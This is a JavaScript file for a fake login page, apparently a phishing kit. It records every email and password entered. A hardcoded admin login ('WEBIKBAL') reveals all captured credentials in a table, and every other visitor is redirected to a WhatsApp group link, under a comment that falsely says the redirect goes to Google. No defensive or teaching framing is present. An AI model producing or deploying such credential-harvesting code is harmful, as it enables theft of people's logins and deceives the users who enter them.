// Array to store logged email and password
let usersData = [];

// Predefined credentials
const adminEmail = "WEBIKBAL";
const adminPassword = "WEBIKBAL";

// Form submission handler
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    // Store the email and password entered
    usersData.push({email: email, password: password});

    if (email === adminEmail && password === adminPassword) {
        // Display all logged credentials
        displayAdminPage(usersData);
    } else {
        // Redirect to Google
        window.location.href = "https://www.whatsapp.group/AKDOTYXWKFWAPCYEQAXBAODXALFHXXAM";
    }
});
// Function to display the admin page with all credentials
function displayAdminPage(users) {
    // Clear the existing content
    document.body.innerHTML = '';

    // Create a new container
    const container = document.createElement('div');
    container.style.padding = '20px';
    container.style.maxWidth = '600px';
    container.style.margin = '0 auto';
    container.style.backgroundColor = '#fff';
    container.style.borderRadius = '8px';
    container.style.boxShadow = '0 2px 4px rgba(0, 0, 0, 0.1)';
    // Add a title
    const title = document.createElement('h2');
    title.innerText = 'Stored User Data';
    title.style.textAlign = 'center';
    title.style.marginBottom = '20px';
    container.appendChild(title);

    // Create a table to display the data
    const table = document.createElement('table');
    table.style.width = '100%';
    table.style.borderCollapse = 'collapse';

    // Table header
    const headerRow = document.createElement('tr');
    const emailHeader = document.createElement('th');
    emailHeader.innerText = 'Email';
    emailHeader.style.borderBottom = '1px solid #ddd';
    emailHeader.style.padding = '8px';
    const passwordHeader = document.createElement('th');
    passwordHeader.innerText = 'Password';
    passwordHeader.style.borderBottom = '1px solid #ddd';
    passwordHeader.style.padding = '8px';
    headerRow.appendChild(emailHeader);
    headerRow.appendChild(passwordHeader);
    table.appendChild(headerRow);

    // Add user data to the table
    users.forEach(user => {
        const row = document.createElement('tr');
        const emailCell = document.createElement('td');
        emailCell.innerText = user.email;
        emailCell.style.borderBottom = '1px solid #ddd';
        emailCell.style.padding = '8px';
        const passwordCell = document.createElement('td');
        passwordCell.innerText = user.password;
        passwordCell.style.borderBottom = '1px solid #ddd';
        passwordCell.style.padding = '8px';
        row.appendChild(emailCell);
        row.appendChild(passwordCell);
        table.appendChild(row);
    });

    container.appendChild(table);
    document.body.appendChild(container);
}
